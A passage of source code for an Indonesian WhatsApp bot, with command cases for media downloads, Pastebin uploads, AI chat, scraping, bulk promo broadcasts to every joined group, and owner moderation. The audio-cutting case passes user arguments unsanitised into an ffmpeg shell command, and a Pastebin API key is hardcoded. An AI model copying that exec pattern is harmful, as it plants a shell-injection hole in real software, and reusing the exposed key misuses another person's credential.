                hasil.push(`✔️ Dihapus: ${u.username} (ID: ${u.id})`);
            } else {
                let errText = await del.text();
                hasil.push(`❌ Gagal hapus ${u.username} (ID: ${u.id}) → ${del.status}`);
            }
        }
        let output = `*[ Clear User ${version.toUpperCase()} Selesai ]*\n\n` + hasil.join('\n');
        m.reply(output);
    } catch (e) {
        m.reply('Terjadi kesalahan: ' + e.message);
    }
}
break

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "unblock");
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'uppastebin': {
  const axios = require('axios')
  const api_dev_key = 'D45XbzLR3GCzS-1Uswyal06hWSJp232G' // https://pastebin.com/doc_api
  let teks = m.quoted?.text ? m.quoted.text : q
  if (!teks) return m.reply(`Kirim teks atau reply pesan teks untuk diupload ke Pastebin.\n\nContoh:\nuppastebin javascript|hello.js|console.log("Halo Dunia")\n\nKetik *uppastebin formats* untuk liat list format.`)
  if (teks.toLowerCase() === 'formats') {
    return m.reply(`*List Pastebin Format Syntax:*\n\n` +
      `4cs, 6502acme, 6502kickass, 6502tasm, abap, actionscript, actionscript3, ada, aimms, algol68, apache, applescript, apt_sources, arm, asm, asp, asymptote, autoconf, autohotkey, autoit, avisynth, awk, bascomavr, bash, basic4gl, batch, bibtex, blitzbasic, bnf, boo, brainfuck, c, c_winapi, c_mac, caddcl, cadlisp, cfdg, chaiscript, cil, clojure, cmake, cobol, coffeescript, cpp, cpp-winapi, cpp-qt, csharp, css, cuesheet, d, dcl, dcpu16, dcs, delphi, diff, div, dos, dot, e, ecmascript, eiffel, email, epc, erlang, f1, falcon, filemaker, fo, fortran, freebasic, freeswitch, gambas, gml, gnuplot, go, groovy, gwbasic, haskell, hicest, hq9plus, html4strict, html5, icon, idl, ini, inno, intercal, io, j, java, java5, javascript, jquery, json, julia, kixtart, klonec, klonecpp, latex, libertybasic, lisp, llvm, locobasic, logtalk, lolcode, lotusformulas, lotusscript, lscript, lua, m68k, magiksf, make, mapbasic, markdown, matlab, mirc, mmix, modula2, modula3, mpasm, mxml, mysql, nagios, netrexx, newlisp, nginx, nim, nsis, oberon2, objc, objeck, ocaml, ocaml-brief, octave, oobas, oorexx, oracle11, oracle8, oz, parasail, parigp, pascal, pcre, per, perl, perl6, pf, php, php-brief, pic16, pike, pixelbender, pl1, plsql, postgresql, povray, powerbuilder, powershell, proftpd, progress, prolog, properties, providex, purebasic, pycon, python, python3, q, qbasic, rails, rebol, reg, rexx, robots, rpmspec, ruby, ruby-brief, rust, sas, sass, scala, scheme, scilab, scl, sdlbasic, smalltalk, smarty, spark, sparql, sql, sshconfig, stata, stonescript, swift, systemverilog, tcl, teraterm, texgraph, thinbasic, tsql, turtle, typoscript, unicon, upc, urbi, uscript, vala, vb, vbnet, verilog, vhdl, vim, visualprolog, vbscript, visualfoxpro, whitespace, whois, winbatch, xbasic, xml, xorg_conf, xpp, yaml, z80, zxbasic`)
  }
  let [format, title, ...isi] = teks.split('|')
  if (!isi.length) {
    isi = [title || format]
    title = `PasteBy-${m.sender.split('@')[0]}`
    format = 'text'
  }
  const params = new URLSearchParams()
  params.append('api_dev_key', api_dev_key)
  params.append('api_option', 'paste')
  params.append('api_paste_code', isi.join('|'))
  params.append('api_paste_name', title) 
  params.append('api_paste_format', format)
  params.append('api_paste_private', '0') 
  params.append('api_paste_expire_date', 'N') 

  try {
    const { data } = await axios.post('https://pastebin.com/api/api_post.php', params)
    m.reply(`*Berhasil diupload ke Pastebin!*\n\n*Judul:* ${title}\n*Format:* ${format}\n*Status:* Public\n*Link:* ${data}`)
  } catch (e) {
    console.error(e)
    m.reply('Gagal upload ke Pastebin. Periksa kembali format input atau API key.')
  }
}
break

case "sendtesti": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: `${prefix}buypanel`
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: `${prefix}buyadp`
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: `${prefix}buyvps`
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: `${prefix}buysc`
                }, 
                {
                  title: 'Digitalocean',
                  id: `${prefix}buydo`
                  }, 
                  {
                    title: 'Jasa Jpm Pesan',
                    id: `${prefix}buyjasajpm`
                  },
                  {
                    title: 'Topup Saldo Ewallet',
                    id: `${prefix}topupsaldo`
                  },
                  {
                    title: 'Topup Diamonds',
                    id: `${prefix}topupdiamond`
                  }, 
                  {
                    title: 'Topup Pulsa',
                    id: `${prefix}isipulsa`
                  }                     
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break
case 'zrooart': {
  const fetch = (await import('node-fetch')).default;
  const FormData = (await import('form-data')).default;
  const input = q ? q.split('|').map(v => v.trim()) : [];
  const prompt = input[0];
  let style = input[1] || 'Fantasy Art';
  let aspect = input[2] || '16:9';
  const styleList = [
    'None', '3D Model', 'Analog Film', 'Anime', 'Cinematic', 'Comic Book',
    'Digital Art', 'Enhance', 'Fantasy Art', 'Isometric', 'Line Art',
    'Low Poly', 'Modeling Compound', 'Neon Punk', 'Origami',
    'Photographic', 'Pixel Art', 'Tile Texture'
  ];
  const ratioList = [
    '16:9', '1:1', '9:16', '4:5', '5:4', '2:3', '3:2', '21:9', '9:21'
  ];
  if (!prompt) {
    return m.reply(`*Format:*
.zrooart <prompt> | <style?> | <ratio?>

*Contoh:*
.zrooart naga api | Anime | 9:16
.zrooart kota masa depan | random | random

*Style yang tersedia:*
${styleList.join(', ')}

*Rasio yang tersedia:*
${ratioList.join(', ')}`);
  }
  if (style.toLowerCase() === 'random') {
    style = styleList[Math.floor(Math.random() * styleList.length)];
  }
  if (aspect.toLowerCase() === 'random') {
    aspect = ratioList[Math.floor(Math.random() * ratioList.length)];
  }
  const form = new FormData();
  form.append('video_description', prompt);
  form.append('test_mode', 'false');
  form.append('negative_prompt', 'blurry, distorted, bad quality');
  form.append('aspect_ratio', aspect);
  form.append('style', style);
  form.append('output_format', 'png');
  form.append('seed', '0');
  m.reply(`⏳ Membuat gambar dari prompt:\n*${prompt}*\nStyle: *${style}*\nRasio: *${aspect}*`);

  try {
    const res = await fetch('https://aiart-zroo.onrender.com/generate', {
      method: 'POST',
      headers: { accept: '*/*' },
      body: form
    });
    const json = await res.json();
    if (!json.success || !json.image_path)
      return m.reply('❌ Gagal membuat gambar:\n' + JSON.stringify(json, null, 2));
    const finalURL = `https://aiart-zroo.onrender.com${json.image_path}?t=${Date.now()}`;
    conn.sendMessage(m.chat, {
      image: { url: finalURL },
      caption: `✅ Gambar berhasil dibuat dari:\n*${prompt}*\nStyle: *${style}*\nRasio: *${aspect}*`
    }, { quoted: m });
  } catch (e) {
    m.reply('❌ Terjadi error:\n' + e.message);
  }
  }
  break
case 'potongaudio':
case 'potongmp3':
case 'cutaudio':
case 'cutmp3': {
    try {
        const { promises } = require('fs');
        const { join } = require('path');
        const { exec } = require('child_process');
        let q = m.quoted ? m.quoted : m;
        let mime = (q.msg || q).mimetype || '';
        if (!/audio/.test(mime)) return m.reply(`Balas VN/audio yang ingin dipotong dengan caption *${prefix + command}*`);
        let audio = await q.download?.();
        if (!audio) return m.reply('Gagal mengunduh audio!');
        if (!argsbiyuoffc[0] || !argsbiyuoffc[1]) return m.reply(
            `*\`Contoh penggunaan:\`*\n${prefix + command} menit:awal menit:akhir\n\n` +
            `*\`Bisa juga dengan:\`*\n${prefix + command} jam:menit:awal jam:menit:akhir\n\n` +
            `*\`Contoh:\`*\n${prefix + command} 00:30 00:40`
        );
        let ran = new Date * 1;
        let tmpPath = join(process.cwd(), 'tmp');
        let media = join(tmpPath, `${ran}.mp3`);
        let filename = join(tmpPath, `${ran}_cut.mp3`);
        await promises.mkdir(tmpPath, { recursive: true });
        await promises.writeFile(media, audio);
        exec(`ffmpeg -ss ${argsbiyuoffc[0]} -i "${media}" -t ${argsbiyuoffc[1]} -c copy "${filename}"`, async (err) => {
            await promises.unlink(media);
            if (err) return m.reply(`_*Error saat memotong audio!*_`);
            let buff = await promises.readFile(filename);
            conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mp4' }, { quoted: m });
            await promises.unlink(filename);
        });
    } catch (e) {
        m.reply(`Terjadi kesalahan: ${e.message}`);
    }
}
    break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "stt": case "searchtiktok": case "stiktok": {
  if (!text) return m.reply('Masukkan query pencarian!')
  let url = `https://api.siputzx.my.id/api/s/tiktok?query=${text}`
  let response = await fetch(url)
  let json = await response.json()
  if (!json.status) return m.reply('Gagal mencari video!')
  let hasil = json.data
  for (let i = 0; i < Math.min(hasil.length, 10); i++) {
    let videoUrl = hasil[i].play
    let caption = `🎥 *TikTok Video* 🎥\n\n${hasil[i].title}\n👤 ${hasil[i].author.nickname}\n👀 ${hasil[i].play_count} views\n❤️ ${hasil[i].digg_count} likes\n💬 ${hasil[i].comment_count} comments\n📢 ${hasil[i].share_count} shares\n\nLink: ${videoUrl}\n\n🔥 *Powered by ${global.packname}* 🔥`
    await conn.sendMessage(m.chat, { video: { url: videoUrl }, caption: caption }, { quoted: m })
    await delay(500)
  }
}
break

case 'play': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: *play Jakarta Hari Ini*');

  try {
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API utama gagal');
    let json = await res.json();
    if (!json.success || !json.result) throw new Error('Respon API utama tidak valid');
    const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;
    const thumbnail = await (await fetch(image)).buffer();
    await conn.sendMessage(m.chat, {
      audio: { url: download.audio },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title,
          body: `${author.name} • ${duration.timestamp}`,
          thumbnail,
          mediaUrl: url,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.warn('Fallback to Nekorinn API:', e.message);
    try {
      let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
      let data = await res.json();
      if (!data.status || !data.result) throw new Error('Respon cadangan 1 tidak valid');
      const { title, channel, duration, imageUrl, link } = data.result.metadata;
      const downloadUrl = data.result.downloadUrl;
      const thumbnail = await (await fetch(imageUrl)).buffer();
      await conn.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title,
            body: `${channel} • ${duration}`,
            thumbnail,
            mediaUrl: link,
            mediaType: 2,
            renderLargerThumbnail: true,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    } catch (err) {
      console.warn('Fallback to Diioffc API:', err.message);
      try {
        const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
        if (!res2.ok) return m.reply('Gagal mengambil data dari server cadangan.');
        const json = await res2.json();
        if (!json.status || !json.result) return m.reply('Lagu tidak ditemukan!');
        const { title, author, duration, thumbnail: thumb, url, download } = json.result;
        const thumbnail = await (await fetch(thumb)).buffer();
        await conn.sendMessage(m.chat, {
          audio: { url: download.url },
          mimetype: 'audio/mpeg',
          fileName: download.filename || `${title}.mp3`,
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              title,
              body: `${author.name} • ${duration.timestamp}`,
              thumbnail,
              mediaUrl: url,
              mediaType: 2,
              renderLargerThumbnail: true,
              sourceUrl: url
            }
          }
        }, { quoted: m });
      } catch (finalErr) {
        console.error(finalErr);
        m.reply('Terjadi kesalahan saat memproses permintaanmu.');
      }
    }
  }
}
break
case 'fakestory': {
  try {
    const { createCanvas, loadImage } = require('canvas')
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let [username, caption] = text.split('|')
    if (!username || !caption) return m.reply(`Contoh:\n.${command} Yubi|Eummm...`)
    const bgUrl = 'https://files.catbox.moe/3gwr1l.jpg'
    const bg = await loadImage(bgUrl)
    const userPP = await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://files.catbox.moe/zxnzgb.jpeg')
    const pp = await loadImage(userPP)
    const canvas = createCanvas(720, 1280)
    const ctx = canvas.getContext('2d')
    ctx.drawImage(bg, 0, 0, canvas.width, canvas.height)
    const ppX = 40
    const ppY = 250
    const ppSize = 70
    ctx.save()
    ctx.beginPath()
    ctx.arc(ppX + ppSize / 2, ppY + ppSize / 2, ppSize / 2, 0, Math.PI * 2)
    ctx.closePath()
    ctx.clip()
    ctx.drawImage(pp, ppX, ppY, ppSize, ppSize)
    ctx.restore()
    ctx.font = '28px Arial'
    ctx.fillStyle = '#FFFFFF'
    ctx.textAlign = 'left'
    ctx.textBaseline = 'middle'
    const usernameX = ppX + ppSize + 15
    const usernameY = ppY + ppSize / 2
    ctx.fillText(username, usernameX, usernameY)
    ctx.font = 'bold 30px Arial'
    ctx.fillStyle = '#FFFFFF'
    ctx.textAlign = 'center'
    ctx.textBaseline = 'top'
    const captionX = canvas.width / 2
    const captionY = canvas.height - 650
    const maxWidth = canvas.width - 100
    const lineHeight = 42
    wrapTextCenter(ctx, caption, captionX, captionY, maxWidth, lineHeight)
    let buffer = canvas.toBuffer()
    await conn.sendMessage(m.chat, {
      image: buffer,
      caption: 'Sukses Kak :v'
    }, { quoted: m })
  } catch (e) {
    m.reply(`❌ Error\nLogs error : ${e.message}`)
  }
  function wrapTextCenter(ctx, text, x, y, maxWidth, lineHeight) {
    let line = ''
    for (let i = 0; i < text.length; i++) {
      let testLine = line + text[i]
      let testWidth = ctx.measureText(testLine).width
      if (testWidth > maxWidth && line !== '') {
        ctx.fillText(line, x, y)
        line = text[i]
        y += lineHeight
      } else {
        line = testLine
      }
    }
    if (line) ctx.fillText(line, x, y)
  }
}
break
case 'capcutstalk': {
  if (!text) return m.reply('Masukkan URL profil CapCut!\nContoh: capcutstalk https://www.capcut.com/discover/creator/...');
  const axios = require('axios');
  const cheerio = require('cheerio');

  async function scrapeCapcutStalk(url) {
    const { data } = await axios.get(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
      },
    });
    const $ = cheerio.load(data);
    const username = $('h1.title-pYC_U9').text().trim();
    const stats = $('div.achieveItem-wjNBbI span.count-qWlNP9').map((i, el) => $(el).text()).get();
    const description = $('div.desc-wvyE3k').text().trim();
    const templates = [];
    $('.verticalLayout-sDNbmV').each((i, el) => {
      const title = $(el).find('.titleBox-BXSEc3').text().trim();
      const views = $(el).find('.cut-label .text').text().trim();
      const date = $(el).find('.tips-TuKRyG').text().trim();
      const thumb = $(el).find('.pictureImg-kT3IMQ').attr('src');
      const link = 'https://www.capcut.com' + $(el).find('a').first().attr('href');
      templates.push({ title, views, date, thumb, link });
    });
    return {
      username,
      followers: stats[1],
      likes: stats[2],
      description,
      templates
    };
  }

  try {
    const result = await scrapeCapcutStalk(text);
    let caption = `*Username:* ${result.username}\n*Followers:* ${result.followers}\n*Likes:* ${result.likes}\n*Deskripsi:* ${result.description || '-'}\n\n`;
    if (result.templates.length === 0) caption += '_Tidak ada template ditemukan_';
    else {
      result.templates.slice(0, 5).forEach((t, i) => {
        caption += `*${i + 1}. ${t.title}*\n- Views: ${t.views}\n- Upload: ${t.date}\n- Link: ${t.link}\n\n`;
      });
    }
    m.reply(caption);
  } catch (e) {
    console.error(e);
    m.reply('Gagal mengambil data. Pastikan URL CapCut benar!');
  }
}
  break
case 'chatgpt': {
    if (!text) return m.reply(`Contoh: ${prefix + command} Apa itu AI?`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        },
        chatgpt3: {
            api: 'https://stablediffusion.fr/gpt3/predict',
            referer: 'https://stablediffusion.fr/chatgpt3'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
const axios = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'Tidak ada jawaban.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nGagal mengambil jawaban.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        m.reply(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        m.reply('Terjadi kesalahan saat mengambil jawaban.');
    }
}
break
case 'playch': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: *playch Jakarta Hari Ini*');
  const playChId = '120363403261361342@newsletter';
  const newsletterInfo = {
    newsletterJid: playChId,
    serverMessageId: 20,
    newsletterName: '𝙠𝙚𝙣𝙣𝙯𝙮 -  𝙆'
  };

  try {
    let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('Nekorinn API error');
    let data = await res.json();
    if (!data.status || !data.result) throw new Error('Invalid data');
    const { title, channel, duration, imageUrl, link } = data.result.metadata;
    const downloadUrl = data.result.downloadUrl;
    const thumbnail = await (await fetch(imageUrl)).buffer();
    await conn.sendMessage(playChId, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: newsletterInfo,
        externalAdReply: {
          title,
          body: `${channel} • ${duration}`,
          thumbnail,
          mediaType: 2,
          renderLargerThumbnail: false,
          sourceUrl: link
        }
      }
    });
    m.reply(`Berhasil mengirim lagu ke channel!`);
  } catch (e) {
    console.warn('Fallback to DiiOffc API:', e.message);
    try {
      const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
      if (!res2.ok) return m.reply('Gagal mengambil data dari server cadangan.');
      const json = await res2.json();
      if (!json.status || !json.result) return m.reply('Lagu tidak ditemukan!');
      const { title, author, duration, thumbnail: thumb, url, download } = json.result;
      const thumbBuffer = await (await fetch(thumb)).buffer();
      const downloadUrl = download.url;
      await conn.sendMessage(playChId, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: download.filename || `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: newsletterInfo,
          externalAdReply: {
            title,
            body: `${author.name} • ${duration.timestamp}`,
            thumbnail: thumbBuffer,
            mediaType: 2,
            renderLargerThumbnail: false,
            sourceUrl: url
          }
        }
      });
      m.reply(`Berhasil mengirim lagu ke channel!`);
    } catch (err) {
      console.error(err);
      m.reply('Terjadi kesalahan saat memproses permintaanmu.');
    }
  }
}
break
case 'binary':
case 'bin': {
  const teks = argsbiyuoffc.join(' ').trim();
  if (!teks) {
    return conn.sendMessage(m.chat, {
      text: `- Contoh penggunaan:\n${prefix}binary --teks "01001000"\n${prefix}binary --binarycode "Hello"`,
    }, { quoted: m });
  }

  try {
    const bintoteks = teks.startsWith('--teks');
    const tekstobin = teks.startsWith('--binarycode');
    if (!bintoteks && !tekstobin) {
      return conn.sendMessage(m.chat, {
        text: `- Tentukan mode konversi:\n--teks (binary ke text)\n--binarycode (text ke binary)`,
      }, { quoted: m });
    }
    const input = teks.split(' ').slice(1).join(' ').trim();
    if (!input) {
      return conn.sendMessage(m.chat, { text: 'Masukkan teks/binary yang valid' }, { quoted: m });
    }
    let hsil;
    if (bintoteks) {
      const cb = input.replace(/[^01 ]/g, '');
      if (!cb) throw new Error('Binary code tidak valid');
      const res = await fetch('https://www.magictool.ai/functions/BINARY-TEXT.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(cb)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    } else {
      const res = await fetch('https://www.magictool.ai/functions/TEXT-BINARY.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(input)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    }
    await conn.sendMessage(m.chat, { text: hsil }, { quoted: m });
  } catch (error) {
    console.error('Error:', error);
    conn.sendMessage(m.chat, {
      text: `Gagal mengkonversi: ${error.message}`,
    }, { quoted: m });
  }
}
break
case 'play-v3': case 'play3':
case 'ytmp3-v2': case 'ytmp32': 
case 'ytmp4-v3': case 'ytmp43': {
  if (!text) return m.reply(`Contoh:\n.play3 someone like you\n.ytmp3-v2 <url>\n.ytmp4-v3 <url>`)
  await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

  async function searchYouTube(query) {
    const axios = require('axios')
    const res = await axios.get('https://www.youtube.com/results', {
      params: { search_query: query },
      headers: { 'User-Agent': 'Mozilla/5.0' }
    })
    const videoId = res.data.match(/"videoId":"(.*?)"/)?.[1]
    if (!videoId) throw 'Video tidak ditemukan'
    return `https://www.youtube.com/watch?v=${videoId}`
  }

  async function ssvidDownloader(url, forceType = null) {
    const axios = require('axios')
    const qs = require('qs')
    if (!/^https:\/\/(www\.)?(youtube\.com|youtu\.be)\//.test(url)) throw 'URL tidak valid'
    const res = await axios.post(
      'https://ssvid.net/api/ajax/search',
      qs.stringify({ query: url, vt: 'home' }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest'
        }
      }
    )

    const data = res.data
    if (!data || data.status !== 'ok') throw 'Gagal mengambil data video'
    const { title, a: author, t: duration, vid } = data
    const thumbnail = `https://img.youtube.com/vi/${vid}/hqdefault.jpg`
    const formats = []
    for (const q in data.links?.mp4 || {}) {
      const v = data.links.mp4[q]
      formats.push({ quality: v.q_text, size: v.size, format: v.f, type: 'video', k: v.k })
    }
    for (const q in data.links?.mp3 || {}) {
      const a = data.links.mp3[q]
      formats.push({ quality: a.q_text, size: a.size, format: a.f, type: 'audio', k: a.k })
    }
    let selected = formats.find(f => f.quality.includes('360p')) || formats[0]
    if (forceType === 'audio') selected = formats.find(f => f.type === 'audio') || selected
    if (forceType === 'video') selected = formats.find(f => f.type === 'video') || selected
    if (!selected || !selected.k) throw 'Tidak ada format yang bisa dikonversi'
    const conv = await axios.post(
      'https://ssvid.net/api/ajax/convert',
      qs.stringify({ vid, k: selected.k }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': 'https://ssvid.net/',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
        }
      }
    )
    const converted = conv.data
    const downloadUrl = converted?.url || converted?.dlink
    if (!downloadUrl) throw 'Gagal mengonversi media'
    return {
      title,
      author,
      duration,
      thumbnail,
      download: {
        url: downloadUrl,
        format: selected.format,
        quality: selected.quality,
        size: selected.size,
        type: selected.type
      }
    }
  }

  let hasil
  if (command == 'play3') {
    const link = await searchYouTube(text)
    hasil = await ssvidDownloader(link, 'audio')
    const info = `YOUTUBE - PLAY\n\nJudul: ${hasil.title}\nAuthor: ${hasil.author}\nDurasi: ${hasil.duration}\nKualitas: ${hasil.download.quality}`
    await conn.sendMessage(m.chat, {
      text: info,
      contextInfo: {
        externalAdReply: {
          title: hasil.title,
          body: 'Play Music',
          thumbnailUrl: hasil.thumbnail,
          sourceUrl: link,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
    return conn.sendMessage(m.chat, {
      audio: { url: hasil.download.url },
      mimetype: 'audio/mp4',
      ptt: false
    }, { quoted: m })
  }

  if (command == 'ytmp3-v2') {
    if (!text.includes('youtu')) return m.reply('Masukkan URL YouTube yang valid')
    hasil = await ssvidDownloader(text, 'audio')
    const info = `YOUTUBE - AUDIO\n\nJudul: ${hasil.title}\nAuthor: ${hasil.author}\nDurasi: ${hasil.duration}\nKualitas: ${hasil.download.quality}`
    await conn.sendMessage(m.chat, {
      text: info,
      contextInfo: {
        externalAdReply: {
          title: hasil.title,
          body: 'YouTube Audio',
          thumbnailUrl: hasil.thumbnail,
          sourceUrl: text,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
    return conn.sendMessage(m.chat, {
      audio: { url: hasil.download.url },
      mimetype: 'audio/mp4',
      ptt: false
    }, { quoted: m })
  }

  if (command == 'ytmp4-v3') {
    if (!text.includes('youtu')) return m.reply('Masukkan URL YouTube yang valid')
    hasil = await ssvidDownloader(text, 'video')
    const info = `YOUTUBE - VIDEO\n\nJudul: ${hasil.title}\nAuthor: ${hasil.author}\nDurasi: ${hasil.duration}\nKualitas: ${hasil.download.quality}`
    return conn.sendMessage(m.chat, {
      video: { url: hasil.download.url },
      mimetype: 'video/mp4',
      caption: info
    }, { quoted: m })
  }
  await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break
case 'banchat': {
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (!banchat.includes(m.chat)) {
    banchat.push(m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    m.reply('✅ Chat ini telah *dibanned*. Semua command akan diabaikan.');
  } else {
    m.reply('⚠️ Chat ini sudah dibanned. Gunakan .unbanchat untuk membuka.');
  }
}
break

case 'unbanchat': {
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (!banchat.includes(m.chat)) {
    m.reply('✅ Chat ini belum diban.');
  } else {
    banchat = banchat.filter(id => id !== m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    m.reply('✅ Chat ini telah *di-unban*. Semua command kembali aktif.');
  }
}
break

case 'listbanchat': {
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (banchat.length === 0) return m.reply('✅ Tidak ada chat yang dibanned.');
  let teks = `📛 *Daftar Chat yang Dibanned:*\n\n`;
  for (let id of banchat) {
    teks += `• ${id}\n`;
  }
  m.reply(teks);
}
break
case 'autojoin':
  if (!isOwner) return m.reply('❌ Khusus owner!');
    if (!text) return m.reply('Gunakan: autojoin on / off')
    if (text.toLowerCase() === 'on') {
        global.autojoin = true
        m.reply('✅ Fitur autojoin telah *diaktifkan*.')
    } else if (text.toLowerCase() === 'off') {
        global.autojoin = false
        m.reply('❌ Fitur autojoin telah *dinonaktifkan*.')        
    } else {
        m.reply('Format salah!\nGunakan: autojoin on / off')
    }
    break
case 'play2':
case 'play-v2': 
case 'ytplay2': {
  if (!text) return m.reply(`Example: ${prefix + command} Lagu sad`);
  try {		
    let search = await yts(`${text}`);
    if (!search || search.all.length === 0) return m.reply(`*Lagu tidak ditemukan!* ☹️`);
    let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
    let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`;
    
    await conn.sendMessage(m.chat, {
      image: { url: image },
      caption: caption,
      footer: `${global.namaOwner}`,
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Tindakan' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
